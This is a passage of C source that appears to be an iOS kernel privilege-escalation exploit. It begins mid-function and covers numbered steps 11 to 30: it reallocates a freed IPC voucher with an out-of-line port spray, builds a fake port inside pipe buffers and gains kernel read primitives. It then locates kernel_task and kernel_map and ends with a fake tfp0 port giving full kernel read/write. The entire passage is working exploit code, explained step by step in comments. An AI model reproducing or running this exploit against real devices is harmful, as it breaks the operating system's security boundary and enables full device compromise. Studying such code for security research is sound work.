	// call thread_set_mach_voucher() to clear it, we'll get an "a freed zone element has been
	// modified in zone ipc vouchers" panic.
	voucher_spray_free(voucher_ports, voucher_spray_count);

	// 11. Reallocate the freed voucher with the OOL port pattern created earlier in the
	// kalloc.32768 zone. We need to do this slowly in order to force a zone garbage
	// collection. Spraying 17% of memory (450 MB on the iPhone XR) with OOL ports should be
	// plenty.
    const size_t ool_ports_spray_size = (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0 ? 0.25 : 0.085) * platform.memory_size;
	mach_port_t *ool_holding_ports = gc_ports + gc_port_count;
	size_t ool_holding_port_count = 500;    // Use at most 500 ports for the spray.
	sprayed_size = ool_ports_spray_size_with_gc(ool_holding_ports, &ool_holding_port_count,
			message_size_for_kalloc_size(512),
			ool_ports, ool_port_count, MACH_MSG_TYPE_MAKE_SEND,
			ool_ports_spray_size);
	INFO("sprayed %zu bytes of OOL ports to %zu ports in kalloc.%zu",
			sprayed_size, ool_holding_port_count, ool_port_spray_kalloc_zone);
	SafeFreeNULL(ool_ports);

	// 12. Once we've reallocated the voucher with an OOL ports allocation, the iv_refs field
	// will overlap with the lower 32 bits of the pointer to base_port. If base_port's address
	// is low enough, this tricks the kernel into thinking that the reference count is valid,
	// allowing us to call thread_get_mach_voucher() without panicking. And since the OOL ports
	// pattern overwrote the voucher's iv_port field with MACH_PORT_NULL,
	// convert_voucher_to_port() will go ahead and allocate a fresh voucher port through which
	// we can manipulate our freed voucher while it still overlaps our OOL ports.
	kr = thread_get_mach_voucher(thread, 0, &uaf_voucher_port);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "thread_get_mach_voucher", kr, mach_error_string(kr));
		ERROR("could not get a voucher port to the freed voucher; reallocation failed?");
		fail();
	}
	if (!MACH_PORT_VALID(uaf_voucher_port)) {
		ERROR("freed voucher port 0x%x is not valid", uaf_voucher_port);
		fail();
	}
	INFO("recovered voucher port 0x%x for freed voucher", uaf_voucher_port);

	// 13. Alright, we've pushed through the first risky part! We now have a voucher port that
	// refers to a voucher that overlaps with our OOL ports spray. Our next step is to modify
	// the voucher's iv_refs field using the reference counting bugs so that the ipc_port
	// pointer it overlaps with now points into our pipe buffers. That way, when we receive the
	// message, we'll get a send right to a fake IPC port object whose contents we control.
	INFO("adding references to the freed voucher to change the OOL port pointer");
	for (size_t i = 0; i < base_port_to_fake_port_offset; i++) {
		voucher_reference(uaf_voucher_port);
	}
	kr = thread_set_mach_voucher(thread, MACH_PORT_NULL);
	if (kr != KERN_SUCCESS) {
		ERROR("could not clear thread voucher");
		// This is a horrible fix, since ith_voucher still points to the freed voucher, but
		// at least it'll make the OOL port pointer correct so the exploit can continue.
		voucher_release(uaf_voucher_port);
	}

	// 14. Now receive the OOL ports and recover our voucher port and the fake port that
	// overlaps our pipe buffers. This is where we're most likely to panic if the port/pipe
	// groom failed and the overlapping OOL port pointer does not point into our pipe buffers.
	INFO("receiving the OOL ports will leak port 0x%x", base_port);
	fake_port = MACH_PORT_NULL;
	ool_ports_spray_receive(ool_holding_ports, ool_holding_port_count,
			^(mach_port_t *ool_ports, size_t count) {
		if (count != ool_port_count) {
			ERROR("unexpected OOL ports count %zu", count);
			return;
		}
		// Loop through each of the possible voucher positions in the OOL ports looking for
		// a sign that this is where the voucher overlaps.
		iterate_ipc_vouchers_via_mach_ports(count, ^(size_t voucher_start) {
			// We're checking to see whether index 7 (which was MACH_PORT_NULL when we
			// sent the message) now contains a port. If it does, that means that this
			// segment of the OOL ports overlapped with the freed voucher, and so when
			// we called thread_get_mach_voucher() above, the iv_port field was set to
			// the newly allocated voucher port (which is what we're receiving now).
			mach_port_t ool_voucher_port = ool_ports[voucher_start + 7];
			if (ool_voucher_port != MACH_PORT_NULL) {
				INFO("received voucher port 0x%x in OOL ports", ool_voucher_port);
				INFO("voucher overlapped at offset 0x%zx",
						voucher_start * sizeof(uint64_t));
				if (ool_voucher_port != uaf_voucher_port) {
					ERROR("voucher port mismatch");
				}
				if (fake_port != MACH_PORT_NULL) {
					ERROR("multiple fake ports");
				}
				fake_port = ool_ports[voucher_start + 1];
				ool_ports[voucher_start + 1] = MACH_PORT_NULL;
				INFO("received fake port 0x%x", fake_port);
			}
		});
	});
	// Make sure we got a fake port.
	if (!MACH_PORT_VALID(fake_port)) {
		if (fake_port == MACH_PORT_NULL) {
			ERROR("did not receive a fake port in OOL ports spray");
		} else {
			ERROR("received an invalid fake port in OOL ports spray");
		}
		fail();
	}

	// 15. Check which pair of pipefds overlaps our port using mach_port_kobject(). The
	// returned type value will be the lower 12 bits of the ipc_port's ip_bits field, which
	// we've set to the index of the pipe overlapping the port during our spray.
	//
	// This is the third and final risky part: we could panic if our fake port doesn't actually
	// point into our pipe buffers. After this, though, it's all smooth sailing.
	natural_t type;
	mach_vm_address_t addr;
	kr = mach_port_kobject(mach_task_self(), fake_port, &type, &addr);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "mach_port_kobject", kr, mach_error_string(kr));
		ERROR("could not determine the pipe index of our port");
	}
	size_t pipe_index = type;
	INFO("port is at pipe index %zu", pipe_index);
	// Get the pipefds that allow us to control the port.
	int *port_pipefds = pipefds_array + 2 * pipe_index;
	pipefds[0] = port_pipefds[0];
	pipefds[1] = port_pipefds[1];
	port_pipefds[0] = -1;
	port_pipefds[1] = -1;

	// 16. Clean up unneeded resources: terminate the ith_voucher thread, discard the filler
	// ports, and close the sprayed pipes.
	thread_terminate(thread);
	destroy_ports(filler_ports, filler_port_count);
	SafeFreeNULL(filler_ports);
	close_pipes(pipefds_array, pipe_count);
	SafeFreeNULL(pipefds_array);

	// 17. Use mach_port_request_notification() to put a pointer to an array containing
	// base_port in our port's ip_requests field.
	mach_port_t prev_notify;
	kr = mach_port_request_notification(mach_task_self(), fake_port,
			MACH_NOTIFY_DEAD_NAME, 0,
			base_port, MACH_MSG_TYPE_MAKE_SEND_ONCE,
			&prev_notify);
	if (kr != KERN_SUCCESS) {
		ERROR("%s returned %d: %s", "mach_port_request_notification",
				kr, mach_error_string(kr));
		ERROR("could not request a notification for the fake port");
		fail();
	}
	assert(prev_notify == MACH_PORT_NULL);

	// 18. Now read back our pipe buffer to discover the value of ip_requests (and get our
	// first kernel pointer!). This also tells us where our port is located inside the pipe
	// buffer.
	read_pipe();
	__block uint64_t ip_requests = 0;
	iterate_ipc_ports(pipe_buffer_size, ^(size_t port_offset, bool *stop) {
		uint8_t *port = (uint8_t *) pipe_buffer + port_offset;
		uint64_t *port_ip_requests = (uint64_t *)(port + OFFSET(ipc_port, ip_requests));
		if (*port_ip_requests != 0) {
			// We've found the overlapping port. Record the offset of the fake port,
			// save the ip_requests array, and set the field in the port to NULL.
			assert(ip_requests == 0);
			fake_port_offset = port_offset;
			ip_requests = *port_ip_requests;
			*port_ip_requests = 0;
		} else {
			// Clear out all the other fake ports.
			memset(port, 0, SIZE(ipc_port));
		}
	});
	// Make sure we found it.
	if (ip_requests == 0) {
		ERROR("could not find %s in pipe buffers", "ip_requests");
		fail();
	}
	INFO("got %s at 0x%016llx", "ip_requests", ip_requests);
	INFO("fake port is at offset %zu", fake_port_offset);
	// Do a write so that the stage0 and stage1 read primitives can start with a pipe read.
	write_pipe();

	// 19. Now that we know the address of an array that contains a pointer to base_port, we
	// need a way to read data from that address so we can locate our pipe buffer in memory.
	//
	// We'll use the traditional pid_for_task() technique to read 4 bytes of kernel memory.
	// However, in order for this technique to work, we need to get a fake task containing an
	// offset pointer to the address we want to read at a known location in memory. We can do
	// that by initializing our fake port, sending a Mach message containing our fake task to
	// the port, and reading out the port's imq_messages field.
	//
	// An unfortunate consequence of this technique is that each 4-byte read leaks an ipc_kmsg
	// allocation. Thus, we'll store the leaked kmsgs so that we can deallocate them later.
	uint64_t leaked_kmsgs[2] = {};
	uint64_t address_of_base_port_pointer = ip_requests
		+ 1 * SIZE(ipc_port_request) + OFFSET(ipc_port_request, ipr_soright);
	base_port_address = stage0_read64(address_of_base_port_pointer, leaked_kmsgs);
	INFO("base port is at 0x%016llx", base_port_address);
	// Check that it has the offset that we expect.
	if (base_port_address % pipe_buffer_size != fake_port_offset) {
		ERROR("base_port at wrong offset");
	}

	// 20. Now use base_port_address to compute the address of the fake port and the containing
	// pipe buffer, and choose an offset for our fake task in the pipe buffer as well. At this
	// point, we can now use our stage 1 read primitive.
	fake_port_address = base_port_address + base_port_to_fake_port_offset;
	pipe_buffer_address = fake_port_address & ~(pipe_buffer_size - 1);
	fake_task_offset = 0;
	if (fake_port_offset < FAKE_TASK_SIZE) {
		fake_task_offset = pipe_buffer_size - FAKE_TASK_SIZE;
	}

	// 21. Now that we have the address of our pipe buffer, we can use the stage 1 read
	// primitive. Get the address of our own task port, which we'll need later.
    extern uint64_t cached_task_self_addr;
	uint64_t task_port_address = cached_task_self_addr = stage1_find_port_address(mach_task_self());
    
	// 22. Our next goal is to build a fake kernel_task port that allows us to read and write
	// kernel memory with mach_vm_read()/mach_vm_write(). But in order to do that, we'll first
	// need to get ipc_space_kernel and kernel_map. We'll use Ian's technique from multi_path
	// for this.
	//
	// First things first, get the address of the host port.
	uint64_t host_port_address = stage1_find_port_address(host);

	// 23. We can get ipc_space_kernel from the host port's ip_receiver.
	uint64_t host_port_ip_receiver = host_port_address + OFFSET(ipc_port, ip_receiver);
	uint64_t ipc_space_kernel = stage1_read64(host_port_ip_receiver);

	// 24. Now we'll iterate through all the ports in the host port's block to try and find the
	// kernel task port, which will give us the address of the kernel task.
	kernel_task = 0;
	uint64_t port_block = host_port_address & ~(BLOCK_SIZE(ipc_port) - 1);
	iterate_ipc_ports(BLOCK_SIZE(ipc_port), ^(size_t port_offset, bool *stop) {
		uint64_t candidate_port = port_block + port_offset;
		bool found = stage1_check_kernel_task_port(candidate_port, &kernel_task);
		*stop = found;
	});
	// Make sure we got the kernel_task's address.
	if (kernel_task == 0) {
		ERROR("could not find kernel_task port");
		fail();
	}
	INFO("kernel_task is at 0x%016llx", kernel_task);

	// 25. Next we can use the kernel task to get the address of the kernel vm_map.
	uint64_t kernel_map = stage1_read64(kernel_task + OFFSET(task, map));

	// 26. Build a fake kernel task port that allows us to read and write kernel memory.
	stage2_init(ipc_space_kernel, kernel_map);
    extern void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0);
    prepare_for_rw_with_fake_tfp0(kernel_task_port);

	// 27. Alright, now kernel_read() and kernel_write() should work, so let's build a safer
	// kernel_task port. This also cleans up fake_port so that we (hopefully) won't panic on
	// exit.
	uint64_t task_pointer = task_port_address + OFFSET(ipc_port, ip_kobject);
	current_task = kernel_read64(task_pointer);
	stage3_init(ipc_space_kernel, kernel_map);

	// 28. We've corrupted a bunch of kernel state, so let's clean up our mess:
	//   - base_port has an extra port reference.
	//   - uaf_voucher_port needs to be destroyed.
	//   - ip_requests needs to be deallocated.
	//   - leaked_kmsgs need to be destroyed.
	clean_up(uaf_voucher_port, ip_requests, leaked_kmsgs,
			sizeof(leaked_kmsgs) / sizeof(leaked_kmsgs[0]));

	// 29. And finally, deallocate the remaining unneeded (but non-corrupted) resources.
	pipe_close(pipefds);
	SafeFreeNULL(pipe_buffer);
	mach_port_destroy(mach_task_self(), base_port);
    
    // 30. Cache our proc_t address
    extern uint64_t cached_proc_struct_addr;
    cached_proc_struct_addr = kernel_read64(current_task + OFFSET(task, bsd_info));

	// And that's it! Enjoy kernel read/write via kernel_task_port.
	INFO("done! port 0x%x is tfp0", kernel_task_port);
}
